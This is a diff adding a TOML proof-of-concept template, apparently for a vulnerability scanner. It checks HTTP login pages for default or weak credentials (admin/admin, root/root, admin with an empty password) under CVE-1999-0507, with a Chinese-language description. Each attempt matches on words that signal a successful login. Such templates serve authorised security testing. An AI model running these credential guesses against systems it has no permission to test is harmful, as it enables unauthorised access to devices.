@@ -1,0 +1,86 @@
+[info]
+author = "ave"
+description = "检测目标网络设备是否存在可猜测的默认或弱口令账户，通过尝试常见默认凭据（如admin/admin、root/root等）登录HTTP管理界面，验证是否存在弱口令漏洞"
+id = "POC-AVE-1999-0761"
+name = "CVE-1999-0507 PoC"
+severity = "high"
+tags = ["ave-1999-0761"]
+vuln_id = [
+    "CVE-1999-0507",
+    "AVE-1999-0761",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin&password=admin"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "dashboard",
+    "Welcome",
+    "logged in",
+    "session",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=root&password=root"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "dashboard",
+    "Welcome",
+    "logged in",
+    "session",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin&password="
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "dashboard",
+    "Welcome",
+    "logged in",
+    "session",
+]
